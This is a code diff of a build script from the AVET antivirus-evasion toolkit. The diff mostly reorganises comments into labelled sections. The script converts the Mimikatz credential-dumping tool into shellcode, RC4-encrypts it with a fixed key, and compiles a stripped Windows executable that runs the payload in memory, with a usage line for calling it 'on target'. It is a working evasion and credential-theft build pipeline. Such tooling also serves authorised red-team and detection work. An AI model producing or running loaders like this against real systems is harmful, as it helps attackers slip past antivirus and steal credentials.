@@ -1,18 +1,5 @@
 #!/bin/bash          
-# RC4-encrypt the payload with a static, preset key.
-# Here, the mimikatz executable is used as payload, converted into shellcode format by pe_to_shellcode.
-# pe_to_shellcode is written by Hasherezade:
-# https://github.com/hasherezade/pe_to_shellcode
 
-# This script expects the Mimikatz executable to be at input/mimikatz.exe
-# and the pe_to_shellcode executable to reside in a folder parallel to avet: ../pe_to_shellcode/pe2shc.exe
-
-# Call generated executable on target like:
-# rc4enc_mimikatz_win64.exe 'your mimikatz arguments, probably coffee'
-
-
-# print AVET logo
-cat banner.txt
 
 # include script containing the compiler var $win64_compiler
 # you can edit the compiler in build/global_win64.sh
@@ -21,6 +8,28 @@ cat banner.txt
 
 # import feature construction interface
 . build/feature_construction.sh
+
+
+#DESCRIPTION_START
+# RC4-encrypt the payload with a static, preset key.
+# Here, the mimikatz executable is used as payload, converted into shellcode format by pe_to_shellcode.
+# pe_to_shellcode is written by Hasherezade:
+# https://github.com/hasherezade/pe_to_shellcode
+
+# This script expects the Mimikatz executable to be at input/mimikatz.exe
+# and the pe_to_shellcode executable to reside in a folder parallel to avet: ../pe_to_shellcode/pe2shc.exe
+#DESCRIPTION_END
+
+
+#CONFIGURATION_START
+# enable debug output
+enable_debug_print
+#CONFIGURATION_END
+
+
+# print AVET logo
+cat banner.txt
+
 
 # convert mimikatz executable into shellcode format
 wine ./../pe_to_shellcode/pe2shc.exe input/mimikatz.exe input/sc_raw.txt
@@ -54,8 +63,6 @@ set_payload_info_source no_data
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode64
 
-# enable debug output
-enable_debug_print
 
 # compile to exe file
 $win64_compiler -o output/rc4enc_mimikatz_win64.exe source/avet.c
@@ -64,6 +71,7 @@ strip output/rc4enc_mimikatz_win64.exe
 # cleanup
 cleanup_techniques
 
-echo "
+#USAGE_START
 # Call generated executable on target like:
-# rc4enc_mimikatz_win64.exe 'your mimikatz arguments, probably coffee'"
+# rc4enc_mimikatz_win64.exe 'your mimikatz arguments, probably coffee'
+#USAGE_END
